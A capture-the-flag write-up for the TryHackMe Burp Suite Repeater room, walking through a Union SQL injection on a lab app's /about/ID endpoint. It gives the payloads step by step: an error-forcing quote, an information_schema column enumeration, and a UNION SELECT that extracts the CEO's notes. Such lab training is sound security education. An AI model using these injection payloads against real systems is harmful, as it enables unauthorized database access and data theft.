# TryHackMe Burp suite: Repeater room

_**TASK 8**_ from:&#x20;

{% embed url="https://tryhackme.com/r/room/burpsuiterepeater" %}

**Challenge Objective**

> Your objective in this challenge is to identify and exploit a Union SQL Injection vulnerability present in the ID parameter of the `/about/ID` endpoint. By leveraging this vulnerability, your task is to launch an attack to retrieve the notes about the CEO stored in the database.

1. `1'`

* To force an error:&#x20;

`Invalid statement:`&#x20;

`SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 1';`

The information provided in the error message tells us about the SQL query used

2. `8 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name='people'`

* The value _**`8`**_ (or any other values that does not match an entry in the database) is used to force the first part of the query to not return any results, so as to allow us to view the results from the subsequent `UNION` statement
* Displays all the columns in the `people` table

3. `8 UNION SELECT notes,null,null,null,null from people where id=1;`

* The ID of the CEO is `1`
* This query will retrieve the content stored in the notes



{% embed url="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#FindColumnsHavingGroupbyErrorBased" %}
